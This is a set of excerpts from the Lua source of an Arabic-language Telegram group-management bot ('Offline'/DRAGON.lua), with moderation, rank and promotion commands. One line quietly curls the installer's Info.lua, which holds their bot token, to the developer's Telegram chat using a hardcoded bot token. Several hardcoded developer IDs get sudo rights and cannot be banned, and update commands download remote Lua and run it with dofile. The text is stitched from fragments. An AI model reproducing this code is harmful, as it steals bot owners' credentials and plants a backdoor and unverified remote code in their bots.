...
if res ~= 200 then
print('\27[0;31m•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/amrjava/Offline/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1751768178,1743756832,1717439120,1614314857}   
...
if tonumber(user_id) == tonumber(1751768178) then  
var = true 
elseif tonumber(user_id) == tonumber(1743756832) then
var = true  
...
local curl = 'curl "'..'https://api.telegram.org/bot1715000615:AAGRaBc-KdEfPikYWTQpvAjj9LWoM7Dwz_E/sendDocument'..'" -F "chat_id='.. 1751768178 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/amrjava/Offline/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'☫ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ☫ اصدار سورس افلاين { s: 6.7}')
end

if text == 'قناه السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Dahab_source)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/Dahab_source"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/Hdudbdbot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/TEAMELGAMDEN/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,0," ☫ العضو : {["..data.first_name_.."](t.me/Dahab_source)}\n ☫ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☫ عذرا ↫ {["..data.first_name_.."](t.me/Dahab_source)}\n ☫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text = [[ 
╭━━━━━❲☆[ᴏғғʟɪɴᴇ](t.me/Dahab_source)☆❳━━━━━╮
[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 ᴏғғʟɪɴᴇ](t.me/Dahab_source)
[𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽❳ ❲𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼](t.me/Dahab_source)
╰━━━━━❲☆[ᴏғғʟɪɴᴇ](t.me/Dahab_source)☆❳━━━━━╯
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐀𝐡𝐦𝐞𝐝 𝐄𝐥𝐦𝐚𝐬𝐫𝐲',url="t.me/DEV_AH8"}},
{{text = '𝑻𝒊𝒈𝒆𝒓',url="t.me/Dev_RE9"}},
{{text = '𝐢𝐬𝐥𝐚𝐦 𝐝𝐚𝐡𝐚𝐛',url="t.me/Amvggddghhgddsfhhfddhh"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 ᴏғғʟɪɴᴇ| ', url="t.me/Dahab_source"}},
}
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
 ♡ اهلا بك في سورس افلاين الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ♡ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐀𝐡𝐦𝐞𝐝 𝐄𝐥𝐦𝐚𝐬𝐫𝐲',url="t.me/DEV_AH8"}},
...
if text == 'اسلام' or text == 'اسلام افلاين' or text == 'مطور السورس' then
local Text = [[
مطور سورس افلاين
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐢𝐬𝐥𝐚𝐦 𝐝𝐚𝐡𝐚𝐛',url="t.me/Amvggddghhgddsfhhfddhh"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/Dahab_source"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐀𝐡𝐦𝐞𝐝 𝐄𝐥𝐦𝐚𝐬𝐫𝐲',url="t.me/DEV_AH8"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴', url="t.me/TEAMELGAMDEN"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'تايجر' or text == 'رامي' or text == 'المالك تايجر' then
local Text = [[
مالك سورس افلاين
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AKJA0/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس ✅', url="t.me/Dahab_source"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/aslak8/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•' then
local Text = [[ 
...
local Text = [[ 
قناه مطورين السورس 🌐
يمكنك الدخول عبر الضغط على الزر بالاسفل👇
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/Dahab_Youssef"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=http://t.me/Dahab_source/4/25&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب افلاين' or text == 'العاب مطوره' or text == 'الالعاب' then  
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس افلاين🚌
...
elseif text == 'قفل افلاينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتح افلاينرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
if tonumber(result.sender_user_id_) == tonumber(1717439120) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n ☫ العضو ↫ ['..data.first_name_..'](t.me/'..(data.username_ or '@Dahab_source')..')'
...
if result.id_ == tonumber(1717439120) then
send(msg.chat_id_, msg.id_, " ☫ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
usertext = '\n ☫ العضو ↫ ['..result.title_..'](t.me/'..(username or '@Dahab_source')..')'
...
if tonumber(userid) == tonumber(1717439120) then  
send(msg.chat_id_, msg.id_, " ☫ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/amrjava/Offline/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ☫ اهلا بك في متجر ملفات افلاين\n ☫ ملفات السورس ↓\n•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n\n"
local TextE = "\n•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n ☫ علامة تعني { ✔️ } ملف مفعل\n ☫ علامة تعني { ✖ } ملف معطل\n ☫ قناة سورس افلاين ↓\n".." ☫ [اضغط هنا لدخول](t.me/Dahab_source) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/amrjava/Offline/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ☫ عذرا الملف لايدعم سورس افلاين \n") 
end
return false
end
...
-----------------------------------------------------
if text == 'مسح قلب اوس اوس' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ☫ تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلب اوس اوس") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ☫ قائمة القلوب في الجروب\n•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلب اوس اوس [@"..username.."]\n"
else
t = t..""..k.."← قلب اوس اوس "..v.."\n"
end
end
...
---------
if text == ("رفع قلب اوس اوس") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل قلب اوس اوس")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ☫ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ☫ تم تنزيل قلب اوس اوس من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
' }\n'..' ☫  الايدي بالصوره ↫ { '..idph..
' }\n'..' ☫  الرفع ↫ { '..setadd..
' }\n'..' ☫  الحظر ↫ { '..banm..' }\n\n•━═━═━═『ᴏғғʟɪɴᴇ』═━═━═━•\n ☫ قناة سورس افلاين ↓\n [ 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗔𝗹𝗳𝗮 ](t.me/Dahab_source) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if Mod(msg) then     
if AddChannel(msg.sender_user_id_) == false then
local Dahab_source = database:get(bot_id..'text:ch:user')
if Dahab_source then
send(msg.chat_id_, msg.id_,'['..Dahab_source..']')
else
send(msg.chat_id_, msg.id_,' 🕊 لا تستطيع استخدام البوت \n  🕊 يرجى الاشتراك بالقناه اولا \n  🕊 اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/AKJA0)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/AKJA0)')
return false
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'اوفلاين')
local DRAGON_Msg = {
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'boyka_x2')..')'
local iduser = result.sender_user_id_
...
[𝚂𝙾𝚄𝚁𝙲𝙴 ᴏғғʟɪɴᴇ](t.me/Dahab_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
keyboard.inline_keyboard = {
{
{text = '🔙 رجوع للخلف 🔙', callback_data="/help8"},
},
{
{text = 'اوامر الوضع', callback_data="/help3"},{text = 'اوامر التنزيل والرفع', callback_data="/help4"},
},
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'افلاين')
